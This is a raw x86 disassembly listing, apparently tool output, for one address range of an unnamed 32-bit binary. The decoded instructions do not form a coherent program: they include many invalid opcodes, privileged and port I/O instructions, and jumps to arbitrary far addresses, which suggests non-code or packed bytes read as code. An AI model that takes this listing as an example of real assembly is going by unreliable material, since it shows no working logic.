  40c2e9:	cli    
  40c2ea:	es adc al,0x1d
  40c2ed:	fs in  eax,dx
  40c2ef:	xchg   esi,eax
  40c2f0:	jo     0x40c351
  40c2f2:	adc    DWORD PTR [ebx+ecx*4],edi
  40c2f5:	push   es
  40c2f6:	or     eax,0x6530c28e
  40c2fb:	cmp    al,0x30
  40c2fd:	mov    edi,0xe44f8147
  40c302:	dec    edi
  40c303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c304:	fimul  DWORD PTR [esp+ebp*2+0x20]
  40c308:	call   FWORD PTR ds:0x1f4f0c2b
  40c30e:	adc    BYTE PTR [esi-0x66],ch
  40c311:	repnz out 0x6c,eax
  40c314:	jbe    0x40c2ed
  40c316:	leave  
  40c317:	div    DWORD PTR [ebx-0x2e]
  40c31a:	imul   eax,DWORD PTR [edi],0x4a
  40c31d:	adc    eax,0x83552229
  40c322:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40c324:	xor    eax,0x6a760624
  40c329:	mov    BYTE PTR [ecx-0x49],dl
  40c32c:	mov    DWORD PTR [esp+ebx*1],esp
  40c32f:	(bad)  
  40c330:	shl    BYTE PTR [ebx-0x2e],cl
  40c333:	enter  0x1cfb,0x87
  40c337:	cdq    
  40c338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c339:	(bad)  
  40c33a:	xchg   edx,eax
  40c33b:	push   esi
  40c33c:	arpl   WORD PTR [eax+ebp*2],sp
  40c33f:	add    BYTE PTR [edi-0x2],ch
  40c342:	dec    edi
  40c343:	retf   0x11db
  40c346:	sbb    BYTE PTR [eax],ch
  40c348:	into   
  40c349:	loope  0x40c383
  40c34b:	lea    ecx,[ebp+0x47]
  40c34e:	sbb    edi,DWORD PTR [eax+0xb2960f0]
  40c354:	mov    ds:0xce62e1f6,eax
  40c359:	pop    ebp
  40c35a:	imul   edx,edx,0x4d
  40c35d:	pop    ebx
  40c35e:	xchg   ecx,eax
  40c35f:	dec    ebp
  40c360:	and    al,0x14
  40c362:	add    al,BYTE PTR ds:0x67eabf5a
  40c368:	inc    edx
  40c369:	js     0x40c2f4
  40c36b:	mov    ebx,0xd84775ec
  40c370:	retf   0xf8d1
  40c373:	call   0xa2478281
  40c378:	sub    BYTE PTR [eax+0x1a63d54f],al
  40c37e:	xor    al,0xfb
  40c380:	dec    edx
  40c381:	out    0x18,eax
  40c383:	add    ebx,ebp
  40c385:	xchg   esi,eax
  40c386:	js     0x40c37f
  40c388:	int    0x32
  40c38a:	xor    al,0xe
  40c38c:	add    DWORD PTR [ecx+0x4d],eax
  40c38f:	push   edi
  40c390:	or     al,0x88
  40c392:	inc    ecx
  40c393:	push   ebp
  40c394:	sub    al,0x19
  40c396:	mov    bl,BYTE PTR [esi-0x5]
  40c399:	into   
  40c39a:	mov    eax,ebp
  40c39c:	(bad)  
  40c39d:	dec    esp
  40c39e:	mov    bl,0xbd
  40c3a0:	iret   
  40c3a1:	push   edx
  40c3a2:	mov    DWORD PTR [edx+0x5c],eax
  40c3a5:	mov    ah,0xa
  40c3a7:	pop    eax
  40c3a8:	scas   al,BYTE PTR es:[edi]
  40c3a9:	mov    ebx,0x306b74e4
  40c3ae:	retf   0xb1b6
  40c3b1:	cmc    
  40c3b2:	sub    DWORD PTR [ecx-0xb77d360],esp
  40c3b8:	fst    QWORD PTR [edx+eiz*1+0x71]
  40c3bc:	add    ch,BYTE PTR [edi+0x3ab1038d]
  40c3c2:	repnz mov ah,0x9e
  40c3c5:	inc    esi
  40c3c6:	repnz repz das 
  40c3c9:	and    eax,0x646f7071
  40c3ce:	sbb    al,bl
  40c3d0:	fisttp DWORD PTR [ebp+0x74a97655]
  40c3d6:	add    dl,BYTE PTR [edx-0x29]
  40c3d9:	dec    edi
  40c3da:	mov    al,0x45
  40c3dc:	daa    
  40c3dd:	pop    ds
  40c3de:	mov    ebp,DWORD PTR [esi+0x2cbe3101]
  40c3e4:	addr16 mov ss,esi
  40c3e7:	mov    edx,DWORD PTR [edx-0x43]
  40c3ea:	mov    ch,0x6
  40c3ec:	ret    0xa031
  40c3ef:	dec    ebp
  40c3f0:	xchg   edx,eax
  40c3f1:	pop    ebp
  40c3f2:	call   0xafe5:0x47f8b805
  40c3f9:	push   ebx
  40c3fa:	ret    0xde34
  40c3fd:	dec    edi
  40c3fe:	or     DWORD PTR [ebp-0x64dbbb8e],esi
  40c404:	mov    bl,0xf1
  40c406:	cwde   
  40c407:	adc    DWORD PTR [edi+0x7],edi
  40c40a:	sbb    BYTE PTR [ecx-0x36],0x6a
  40c40e:	pop    ebp
  40c40f:	jp     0x40c3fe
  40c411:	jmp    0x93a99b19
  40c416:	sub    ebp,0x17
  40c419:	or     bl,BYTE PTR [ebp+0x3e2dd7b9]
  40c41f:	imul   edi,DWORD PTR [esi-0x55],0xa73b95c
  40c426:	mov    ch,0x36
  40c428:	rcl    DWORD PTR [esi+ebx*2+0x3],cl
  40c42c:	pop    esp
  40c42d:	jo     0x40c49a
  40c42f:	push   ss
  40c430:	xchg   BYTE PTR [ebp+0x3a],bl
  40c433:	jo     0x40c4b1
  40c435:	sbb    eax,0xd38e7655
  40c43a:	jl     0x40c448
  40c43c:	repnz aas 
  40c43e:	dec    esi
  40c43f:	outs   dx,DWORD PTR ds:[esi]
  40c440:	xchg   esp,eax
  40c441:	dec    ebx
  40c442:	cwde   
  40c443:	mov    ds:0x9197efc3,al
  40c448:	sub    al,0xfe
  40c44a:	xchg   ebp,eax
  40c44b:	nop
  40c44c:	adc    bh,BYTE PTR [eax+edx*8+0x67]
  40c450:	js     0x40c4a0
  40c452:	call   0xfa98:0x3f5dafcc
  40c459:	inc    edi
  40c45a:	scas   al,BYTE PTR es:[edi]
  40c45b:	mov    al,0x0
  40c45d:	test   eax,0x5543048b
  40c462:	loop   0x40c457
  40c464:	scas   al,BYTE PTR es:[edi]
  40c465:	(bad)  
  40c466:	fdivr  DWORD PTR [edx]
  40c468:	sub    eax,0xdc954473
  40c46d:	xchg   edx,eax
  40c46e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c46f:	lods   eax,DWORD PTR ds:[esi]
  40c470:	int3   
  40c471:	lahf   
  40c472:	enter  0x73c7,0x6b
  40c476:	xchg   ebp,eax
  40c477:	sbb    edi,DWORD PTR [ebp+0x270015fb]
  40c47d:	idiv   DWORD PTR [ecx+0x19]
  40c480:	sub    al,0xa9
  40c482:	out    dx,eax
  40c483:	data16 mov al,ds:0xa0e21ff
  40c489:	and    edx,DWORD PTR [esi+0x1b]
  40c48c:	jl     0x40c4a9
  40c48e:	add    DWORD PTR [bx+di-0x5694],edi
  40c493:	cwde   
  40c494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c495:	repz into 
  40c497:	jg     0x40c483
  40c499:	inc    ebx
  40c49a:	popa   
  40c49b:	es aad 0x74
  40c49e:	cld    
  40c49f:	jb     0x40c506
  40c4a1:	mov    dh,BYTE PTR [ebp-0x65]
  40c4a4:	jmp    0x6688:0x3e6fde5b
  40c4ab:	add    eax,0x84715418
  40c4b0:	pop    edx
  40c4b1:	psllw  mm3,0x41
  40c4b5:	cli    
  40c4b6:	pushf  
  40c4b7:	into   
  40c4b8:	(bad)  
  40c4b9:	mov    ch,0x21
  40c4bb:	ds pop ecx
  40c4bd:	or     eax,0x32d4cd65
  40c4c2:	xchg   ebp,eax
  40c4c3:	sbb    cl,al
  40c4c5:	adc    edx,DWORD PTR [edi]
  40c4c7:	xor    edi,DWORD PTR [esi]
  40c4c9:	or     BYTE PTR [edi+0x5a],0x51
  40c4cd:	or     eax,0xa5968c7
  40c4d2:	fdiv   QWORD PTR [esp+ebx*1-0x3a]
  40c4d6:	inc    esp
  40c4d7:	out    dx,al
  40c4d8:	jmp    0xa522c624
  40c4dd:	retf   0x933d
  40c4e0:	lahf   
  40c4e1:	push   cs
  40c4e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4e3:	loope  0x40c55a
  40c4e5:	sbb    eax,0x941dc079
  40c4ea:	or     ch,BYTE PTR [ecx+0xb76c4ca]
  40c4f0:	add    DWORD PTR [ecx+0x7d],0xffffffb5
  40c4f4:	mov    ebx,0xa9385413
  40c4f9:	lea    esp,[ebp+0x1a]
  40c4fc:	mov    ?,ecx
  40c4fe:	cmp    al,0x1a
  40c500:	scas   al,BYTE PTR es:[edi]
  40c501:	daa    
  40c502:	add    BYTE PTR es:[edi+0x3d48d124],cl
  40c509:	(bad)  
  40c50b:	push   edx
  40c50c:	mov    bl,0xb3
  40c50e:	inc    edx
  40c50f:	je     0x40c4fb
  40c511:	sub    ecx,DWORD PTR [edi+0x27]
  40c514:	rcr    BYTE PTR [ebx],1
  40c516:	xchg   esp,eax
  40c517:	push   es
  40c518:	xor    bh,BYTE PTR [edx+0x5]
  40c51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c51c:	dec    esp
  40c51d:	push   eax
  40c51e:	sar    DWORD PTR [edx-0x68aedd0],0xd2
  40c525:	popa   
  40c526:	mov    eax,ds:0x83ed3b7
  40c52b:	jp     0x40c53c
  40c52d:	shl    al,0x3a
  40c530:	mov    ebx,0x8cd1d640
  40c535:	jl     0x40c56f
  40c537:	das    
  40c538:	outs   dx,BYTE PTR ds:[esi]
  40c539:	fld    TBYTE PTR [edi+0x1]
  40c53c:	test   bl,ch
  40c53e:	mov    dl,0x7b
  40c540:	stos   DWORD PTR es:[edi],eax
  40c541:	sbb    al,0xff
  40c543:	xchg   DWORD PTR [ecx-0x45b306bd],edx
  40c549:	retf   
  40c54a:	mov    edx,0x4a778c4c
  40c54f:	or     cl,0x7a
  40c552:	push   0x6be994be
  40c557:	pop    edx
  40c558:	mov    ebp,0xfb8b3473
  40c55d:	add    esp,DWORD PTR [eax-0x1a2728d]
  40c563:	das    
  40c564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c565:	or     DWORD PTR [ebp+0x13],edi
  40c568:	xor    ah,BYTE PTR [esi]
  40c56a:	pop    ds
  40c56b:	push   esp
  40c56c:	imul   esp,DWORD PTR [ecx+0x26498e75],0x2d
  40c573:	mov    bl,ch
  40c575:	ret    0xf5d1
  40c578:	adc    ebx,edi
  40c57a:	cdq    
  40c57b:	arpl   bp,bx
  40c57d:	xchg   ecx,eax
  40c57e:	loope  0x40c594
  40c580:	dec    esp
  40c581:	dec    BYTE PTR [ebx]
  40c583:	inc    esi
  40c584:	dec    esp
  40c585:	mov    edi,0x5124d2d2
  40c58a:	aad    0x4e
  40c58c:	aam    0x23
  40c58e:	stos   DWORD PTR es:[edi],eax
  40c58f:	xchg   ecx,eax
  40c590:	call   0x3604e24e
  40c595:	cmp    DWORD PTR [ecx-0x7ab07b61],ebx
  40c59b:	int3   
  40c59c:	loope  0x40c571
  40c59e:	(bad)  
  40c59f:	mov    ds:0x99143c73,eax
  40c5a4:	pop    esp
  40c5a5:	mov    ch,0x4
  40c5a7:	xor    edi,esp
  40c5a9:	adc    al,0x34
  40c5ab:	jo     0x40c604
  40c5ad:	retf   0x6190
  40c5b0:	imul   esi,ecx,0x543cacbd
  40c5b6:	test   eax,0x12d298f7
  40c5bb:	ret    0x5e11
  40c5be:	jae    0x40c576
  40c5c0:	inc    edi
  40c5c1:	and    eax,0x2cff95a3
  40c5c6:	push   0xc87a9c86
  40c5cb:	xor    DWORD PTR [edx],0x8bd26d74
  40c5d1:	xchg   BYTE PTR [eax+eiz*4],bh
  40c5d4:	mov    cl,0xb
  40c5d6:	or     al,0xfb
  40c5d8:	test   ebx,0x8b767d8
  40c5de:	cmp    BYTE PTR [esi+0x73],bh
  40c5e1:	push   esp
  40c5e2:	dec    eax
  40c5e3:	and    ebp,DWORD PTR [esi-0x75]
  40c5e6:	fild   WORD PTR [esi+0x76]
  40c5e9:	jl     0x40c5e9
  40c5eb:	fisttp DWORD PTR [eax]
  40c5ed:	sbb    ah,BYTE PTR [edi-0x5a8610e]
  40c5f3:	or     cl,al
  40c5f5:	sti    
  40c5f6:	dec    esi
  40c5f7:	hlt    
  40c5f8:	(bad)  
  40c5f9:	jle    0x40c655
  40c5fb:	dec    eax
  40c5fc:	fsubr  QWORD PTR [ecx+0x58]
  40c5ff:	push   eax
  40c600:	inc    ebp
  40c601:	ficom  DWORD PTR [ebx]
  40c603:	xchg   edx,eax
  40c604:	sbb    BYTE PTR [edx-0x4c4a6258],dh
  40c60a:	pop    esp
  40c60b:	in     al,dx
  40c60c:	add    eax,0x1be59689
  40c611:	or     ah,0x22
  40c614:	and    ah,BYTE PTR [eax+ecx*8+0x26]
  40c618:	nop
  40c619:	leave  
  40c61a:	js     0x40c5e2
  40c61c:	push   0xfffffffb
  40c61e:	push   esp
  40c61f:	call   0xefdad59b
  40c624:	cmp    dl,bh
  40c626:	scas   eax,DWORD PTR es:[edi]
  40c627:	ja     0x40c5bb
  40c629:	(bad)  
  40c62a:	xchg   esi,eax
  40c62b:	push   esp
  40c62c:	push   edi
  40c62d:	enter  0xd80e,0x9c
  40c631:	fstp   QWORD PTR [ebx+ebp*2]
  40c634:	dec    esi
  40c635:	sbb    BYTE PTR [edi-0xd8a158],bh
  40c63b:	pop    edi
  40c63c:	sbb    BYTE PTR [ebx-0x173492ef],cl
  40c642:	jp     0x40c635
  40c644:	fist   DWORD PTR [eax]
  40c646:	cmc    
  40c647:	dec    edi
  40c648:	fist   WORD PTR [edx+0x2d]
  40c64b:	lea    esi,[ebp-0x7d4aaf6a]
  40c651:	push   esi
  40c652:	test   al,0x6c
  40c654:	sub    dh,BYTE PTR [ebp+0x3a26d139]
  40c65a:	sbb    al,0x59
  40c65c:	push   0x24
  40c65e:	mov    esp,ebx
  40c660:	(bad)  
  40c661:	xor    DWORD PTR [edx],ebx
  40c663:	xchg   ebp,eax
  40c664:	mov    DWORD PTR [ecx+0x7f7e6a70],ecx
  40c66a:	inc    ecx
  40c66b:	pushf  
  40c66c:	mov    DWORD PTR ds:0x369f92ff,ebx
  40c672:	icebp  
  40c673:	lea    esi,[ecx]
  40c675:	mov    esi,0xabe45e9b
  40c67a:	and    eax,0xce4a1fc
  40c67f:	shl    al,1
  40c681:	clc    
  40c682:	mov    bl,0x75
  40c684:	outs   dx,BYTE PTR ds:[esi]
  40c685:	and    DWORD PTR [esi-0x20],0x7a
  40c689:	push   esi
  40c68a:	cli    
  40c68b:	push   DWORD PTR [eax+edx*2-0x4b7360af]
  40c692:	scas   eax,DWORD PTR es:[edi]
  40c693:	adc    ch,BYTE PTR [ecx]
  40c695:	pop    edx
  40c696:	mov    ss,WORD PTR [edi+0x79]
  40c699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c69a:	inc    ecx
  40c69b:	cmp    esi,DWORD PTR [ecx-0x7f]
  40c69e:	push   edx
  40c69f:	imul   ecx,ecx,0x69b94259
  40c6a5:	or     al,0x6c
  40c6a7:	sub    DWORD PTR [eax+0x4d],eax
  40c6aa:	xor    dl,ah
  40c6ac:	add    BYTE PTR [ecx-0x19afb77f],ah
  40c6b2:	push   edi
  40c6b3:	push   ecx
  40c6b4:	(bad)  
  40c6b6:	push   si
  40c6b8:	ja     0x40c6bc
  40c6ba:	into   
  40c6bb:	cmp    ebp,ebp
  40c6bd:	pop    esi
  40c6be:	inc    edx
  40c6bf:	add    BYTE PTR [ebp-0x2d],cl
  40c6c2:	call   0x5b0d3f6
  40c6c7:	mov    eax,0x20609d42
  40c6cc:	mov    cl,0x66
  40c6ce:	sbb    DWORD PTR [edx+eax*8+0x270d8089],esp
  40c6d5:	xchg   BYTE PTR [esi+0x5d8e6bcd],ch
  40c6db:	push   ebx
  40c6dc:	adc    al,0x67
  40c6de:	cwde   
  40c6df:	pushf  
  40c6e0:	data16 out dx,al
  40c6e2:	xchg   ecx,eax
  40c6e3:	cld    
  40c6e4:	sub    ebp,eax
  40c6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6e7:	jo     0x40c6ee
  40c6e9:	push   esi
  40c6ea:	retf   0x61a9
  40c6ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6ef:	dec    ecx
  40c6f0:	and    DWORD PTR [ebp-0x1ac7f254],eax
  40c6f6:	mov    eax,ds:0x3733639b
  40c6fb:	lock enter 0x6c6b,0xe3
  40c700:	mov    esp,0xa465bde
  40c705:	aam    0x5
  40c707:	lds    edx,FWORD PTR [ebx+0x3b9949aa]
  40c70d:	jns    0x40c716
  40c70f:	add    BYTE PTR [ebp-0x5a208210],ah
  40c715:	ss pop esi
  40c717:	cvtpi2ps xmm3,QWORD PTR [ecx]
  40c71a:	or     DWORD PTR [edi+0x5496fdfe],ebx
  40c720:	xchg   DWORD PTR [edi+0x158e3b0b],edi
  40c726:	mov    ecx,0x91771213
  40c72b:	pcmpeqw mm6,QWORD PTR [edx+0x2b086cca]
  40c732:	adc    ebp,DWORD PTR [ecx]
  40c734:	cs addr16 (bad) 
  40c737:	int3   
  40c738:	dec    edi
  40c739:	mov    eax,ds:0x76b0ca6a
  40c73e:	test   eax,0xa7204b43
  40c743:	clc    
  40c744:	jne    0x40c70f
  40c746:	add    eax,0x756e3d68
  40c74b:	inc    eax
  40c74c:	sub    esi,edx
  40c74e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74f:	mov    ebp,0xced10078
  40c754:	aam    0x5b
  40c756:	out    0x26,eax
  40c758:	pushf  
  40c759:	or     BYTE PTR [eax],al
  40c75b:	js     0x40c72a
  40c75d:	xchg   edi,eax
  40c75e:	addr16 inc ebp
  40c760:	(bad)  
  40c761:	fild   WORD PTR [ebx+eiz*8+0xe]
  40c765:	mul    BYTE PTR [esi+0x6a29f1a3]
  40c76b:	retf   0xf8ac
  40c76e:	sub    al,0xc
  40c770:	ja     0x40c752
  40c772:	mov    dl,0x1a
  40c774:	pushf  
  40c775:	int3   
  40c776:	(bad)  
  40c777:	leave  
  40c778:	nop
  40c779:	mov    ecx,0x3eb52cce
  40c77e:	inc    ecx
  40c77f:	mov    DWORD PTR [eax-0xa0b6422],edi
  40c785:	lahf   
  40c786:	mov    eax,ds:0xd9306082
  40c78b:	cmp    eax,0xdb787a7e
  40c790:	jle    0x40c76b
  40c792:	retf   
  40c793:	inc    esp
  40c794:	enter  0xb110,0x1f
  40c798:	fwait
  40c799:	hlt    
  40c79a:	pop    esi
  40c79b:	mov    dl,0xd7
  40c79d:	adc    dh,BYTE PTR [edx-0x749a3e5]
  40c7a3:	scas   al,BYTE PTR es:[edi]
  40c7a4:	xor    al,BYTE PTR [ebp-0x75607eb2]
  40c7aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7ab:	dec    esi
  40c7ac:	push   edx
  40c7ad:	lds    esp,FWORD PTR [esi-0x2f]
  40c7b0:	ret    0xcaa0
  40c7b3:	scas   al,BYTE PTR es:[edi]
  40c7b4:	pop    edi
  40c7b5:	out    0xfb,al
  40c7b7:	dec    esi
  40c7b8:	mov    edi,0x6c7d04be
  40c7bd:	popa   
  40c7be:	add    al,0x46
  40c7c0:	sbb    DWORD PTR [ecx-0x16],edx
  40c7c3:	je     0x40c828
  40c7c5:	push   eax
  40c7c6:	add    edi,DWORD PTR [edx+0x6c6cba7b]
  40c7cc:	(bad)  
  40c7cd:	jns    0x40c7fe
  40c7cf:	retf   
  40c7d0:	les    ebx,FWORD PTR [ecx]
  40c7d2:	outs   dx,BYTE PTR ds:[esi]
  40c7d3:	lahf   
  40c7d4:	mov    dl,0xbb
  40c7d6:	frstor [esi+edi*4-0x793fb009]
  40c7dd:	xchg   ebp,eax
  40c7de:	(bad)  
  40c7e0:	add    dh,BYTE PTR [esi+0x23]
  40c7e3:	sbb    BYTE PTR [esp+ebp*4-0x47],ah
  40c7e7:	in     eax,0x7d
  40c7e9:	outs   dx,BYTE PTR ds:[esi]
  40c7ea:	mov    dl,0x99
  40c7ec:	jmp    0x14ac:0x4ef9044a
  40c7f3:	pop    eax
  40c7f4:	cmp    DWORD PTR ds:0xd709021c,ebx
  40c7fa:	sbb    dh,bl
  40c7fc:	inc    ebp
  40c7fd:	xor    DWORD PTR [eax+edi*1],ecx
  40c800:	sbb    DWORD PTR [edx+0x31],ebp
  40c803:	daa    
  40c804:	or     cl,ch
  40c806:	pop    edx
  40c807:	adc    al,ah
  40c809:	mov    eax,ds:0x1a7f8f16
  40c80e:	icebp  
  40c80f:	push   esi
  40c810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c811:	ror    esp,1
  40c813:	mov    edx,0x65c368c7
  40c818:	jge    0x40c7d6
  40c81a:	pop    ebp
  40c81b:	jns    0x40c880
  40c81d:	adc    ecx,ebx
  40c81f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c820:	sub    eax,0x31eadb9f
  40c825:	cmc    
  40c826:	push   eax
  40c827:	pop    edi
  40c828:	or     ebp,DWORD PTR [esi+edx*8+0x11]
  40c82c:	call   FWORD PTR [ebp-0x1ec0265a]
  40c832:	clc    
  40c833:	inc    edx
  40c834:	rcr    BYTE PTR [edi-0x2e],1
  40c837:	les    esi,FWORD PTR [esi]
  40c839:	aad    0x23
  40c83b:	and    dh,al
  40c83d:	(bad)  
  40c83f:	(bad)  [eax]
  40c841:	bound  eax,QWORD PTR [edx+0x2c]
  40c844:	and    ebp,DWORD PTR [ebp-0x23]
  40c847:	push   0x32
  40c849:	aam    0x97
  40c84b:	pop    ecx
  40c84c:	leave  
  40c84d:	jmp    0x7015:0x783286cd
  40c854:	inc    esi
  40c855:	ficom  WORD PTR [edi-0x75eb59df]
  40c85b:	clc    
  40c85c:	hlt    
  40c85d:	clc    
  40c85e:	shr    BYTE PTR [esi],cl
  40c860:	int3   
  40c861:	sbb    edi,DWORD PTR [esi+eiz*4]
  40c864:	stc    
  40c865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c867:	push   ebp
  40c868:	xor    esp,DWORD PTR ds:0x3610b090
  40c86e:	jmp    0x40c803
  40c870:	pop    ebp
  40c871:	or     ebp,DWORD PTR [edi-0x25]
  40c874:	sub    DWORD PTR [edx-0x45],eax
  40c877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c878:	or     DWORD PTR [edx-0x4fb6a9f1],eax
  40c87e:	push   cs
  40c87f:	adc    BYTE PTR [ebx-0x24575c6],dl
  40c885:	jmp    0x5d5e4a5c
  40c88a:	sti    
  40c88b:	xchg   BYTE PTR [esi],bl
  40c88d:	out    dx,al
  40c88e:	jae    0x40c876
  40c890:	push   DWORD PTR ds:[eax-0x72d682a6]
  40c897:	test   cl,ch
  40c899:	jb     0x40c89c
  40c89b:	inc    edx
  40c89c:	jecxz  0x40c8c3
  40c89e:	mov    bh,0x64
  40c8a0:	(bad)  
  40c8a1:	pop    esi
  40c8a2:	lea    esi,[esi+0x2f]
  40c8a5:	push   ebp
  40c8a6:	xchg   ecx,eax
  40c8a7:	mov    ebx,0xf77ca9be
  40c8ac:	sbb    ah,BYTE PTR [edi]
  40c8ae:	sahf   
  40c8af:	inc    eax
  40c8b0:	ficom  WORD PTR [ebp+0x6d]
  40c8b3:	fwait
  40c8b4:	fs in  al,dx
  40c8b6:	mov    esi,0x8c03724
  40c8bb:	add    BYTE PTR [ebx-0x5afe30ec],ch
  40c8c1:	pop    edi
  40c8c2:	push   esp
  40c8c3:	or     bl,BYTE PTR [edx+0x15]
  40c8c6:	dec    edx
  40c8c7:	mov    eax,0x8850851f
  40c8cc:	add    BYTE PTR [ecx-0x42],al
  40c8cf:	outs   dx,DWORD PTR ds:[esi]
  40c8d0:	(bad)  
  40c8d1:	out    0xf3,al
  40c8d3:	mov    ah,0xb3
  40c8d5:	add    eax,0xc33818e4
  40c8da:	leave  
  40c8db:	pop    ebx
  40c8dc:	ja     0x40c87f
  40c8de:	mov    ds:0x5378daf6,eax
  40c8e3:	icebp  
  40c8e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e5:	cmp    DWORD PTR [edi+0x3b],edi
  40c8e8:	into   
  40c8e9:	pop    ecx
  40c8ea:	hlt    
  40c8eb:	ds popf 
  40c8ed:	daa    
  40c8ee:	ficom  DWORD PTR [eax-0x17]
  40c8f1:	fwait
  40c8f2:	cs std 
  40c8f4:	jno    0x40c8fa
  40c8f6:	mov    esp,0x403ff857
  40c8fb:	les    eax,FWORD PTR [esi]
  40c8fd:	sub    cl,dh
  40c8ff:	adc    eax,DWORD PTR [edx-0x58]
  40c902:	sub    DWORD PTR [edi+esi*8+0x62e0208c],esi
  40c909:	lock push ds
  40c90b:	and    cl,dl
  40c90d:	mov    ch,0x7c
  40c90f:	call   0xfa1ba526
  40c914:	jle    0x40c91f
  40c916:	jle    0x40c8bf
  40c918:	stos   BYTE PTR es:[edi],al
  40c919:	(bad)  
  40c91a:	jmp    0x40c8a9
  40c91c:	ficom  DWORD PTR [esi+0x728bd4c]
  40c922:	icebp  
  40c923:	into   
  40c924:	fndisi(8087 only) 
  40c926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c927:	lock mov dl,0x1b
  40c92a:	push   ebp
  40c92b:	lods   eax,DWORD PTR ds:[esi]
  40c92c:	(bad)  
  40c92d:	push   ss
  40c92e:	adc    BYTE PTR [ebx-0x60],bl
  40c931:	xor    eax,0xa809d073
  40c936:	aam    0x6d
  40c938:	std    
  40c939:	sbb    edi,DWORD PTR [esi-0x2623dd6]
  40c93f:	scas   al,BYTE PTR es:[edi]
  40c940:	jb     0x40c93b
  40c942:	jp     0x40c973
  40c944:	push   edx
  40c945:	xchg   ebx,edi
  40c947:	sbb    eax,0x2d7b1375
  40c94c:	pop    edi
  40c94d:	test   BYTE PTR [ebx-0x6d],ah
  40c950:	pusha  
  40c951:	addr16 pop ecx
  40c953:	and    ebp,esp
  40c955:	das    
  40c956:	push   ss
  40c957:	fdivr  DWORD PTR ds:0xe13dcc8e
  40c95d:	or     DWORD PTR [edi+0x658c4965],0xffffff9e
  40c964:	sub    DWORD PTR [esi+ebp*1],ebx
  40c967:	fsubr  QWORD PTR [ecx-0x65fcbf0e]
  40c96d:	and    al,bl
  40c96f:	sub    al,BYTE PTR [edi+edx*4]
  40c972:	imul   esi,ecx,0xdb9cdcf9
  40c978:	lods   eax,DWORD PTR ds:[esi]
  40c979:	les    edx,FWORD PTR [ebx+edx*2+0x1d]
  40c97d:	daa    
  40c97e:	jne    0x40c9b8
  40c980:	mov    al,es:0xa96571d3
  40c986:	iret   
  40c987:	inc    esp
  40c988:	lods   eax,DWORD PTR ds:[esi]
  40c989:	sub    DWORD PTR [ebp+esi*2+0x7c],edx
  40c98d:	icebp  
  40c98e:	into   
  40c98f:	mov    bh,0x31
  40c991:	mov    ecx,0xed1e0c3a
  40c996:	xchg   edi,eax
  40c997:	mov    DWORD PTR [ecx],ebx
  40c999:	pop    esp
  40c99a:	fidiv  DWORD PTR [ebp-0x2c]
  40c99d:	inc    edx
  40c99e:	icebp  
  40c99f:	mov    ebx,0xa923dbdd
  40c9a4:	jae    0x40ca11
  40c9a6:	and    dh,dl
  40c9a8:	enter  0x4c75,0x93
  40c9ac:	test   eax,0xc5e630ef
  40c9b1:	push   eax
  40c9b2:	not    DWORD PTR [ebx+ebx*4]
  40c9b5:	bswap  esi
  40c9b7:	push   ebx
  40c9b8:	mov    edi,0xe1bf481d
  40c9bd:	dec    esp
  40c9be:	fs sahf 
  40c9c0:	sbb    esp,DWORD PTR [edi*1-0x5ca7916c]
  40c9c7:	leave  
  40c9c8:	add    DWORD PTR [esp+eax*1-0x20ccda9d],esp
  40c9cf:	inc    esi
  40c9d0:	mov    al,dh
  40c9d2:	and    bl,0x71
  40c9d5:	enter  0x62c2,0x17
  40c9d9:	mov    ds:0x9d649e9d,al
  40c9de:	sub    DWORD PTR [edi+0x75],ebx
  40c9e1:	jb     0x40c9a8
  40c9e3:	pusha  
  40c9e4:	stos   DWORD PTR es:[edi],eax
  40c9e5:	sub    DWORD PTR [edi+eax*2-0x5c],0x19
  40c9ea:	jae    0x40ca30
  40c9ec:	jns    0x40ca25
  40c9ee:	cmp    DWORD PTR ds:0x641fef1f,esp
  40c9f4:	adc    eax,ebx
  40c9f6:	mov    cs,WORD PTR [edi]
  40c9f8:	in     al,dx
  40c9f9:	push   cs
  40c9fa:	enter  0xc7cd,0xf4
  40c9fe:	pusha  
  40c9ff:	in     eax,0xa2
  40ca01:	mov    edi,0xe5f54bf
  40ca06:	xchg   ebp,eax
  40ca07:	cmc    
  40ca08:	scas   eax,DWORD PTR es:[edi]
  40ca09:	and    eax,0x6594451b
  40ca0e:	ja     0x40ca17
  40ca10:	bswap  ebx
  40ca12:	or     ch,bl
  40ca14:	ins    BYTE PTR es:[edi],dx
  40ca15:	enter  0x1779,0x46
  40ca19:	jl     0x40c9cf
  40ca1b:	push   esi
  40ca1c:	mov    ecx,0xf83600a6
  40ca21:	js     0x40ca91
  40ca23:	mov    cl,0xae
  40ca25:	(bad)  [esi+0x7b]
  40ca28:	mov    esp,0x83495708
  40ca2d:	cmc    
  40ca2e:	pusha  
  40ca2f:	ficomp WORD PTR [edx-0x51]
  40ca32:	arpl   sp,bx
  40ca34:	xchg   esi,eax
  40ca35:	aam    0x64
  40ca37:	push   0xffffffc8
  40ca39:	push   0xffffffea
  40ca3b:	lahf   
  40ca3c:	and    DWORD PTR [ebx+0x5e93d44b],0x9572e8fe
  40ca46:	inc    ecx
  40ca47:	jge    0x40ca24
  40ca49:	ret    
  40ca4a:	(bad)  
  40ca4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca4c:	cld    
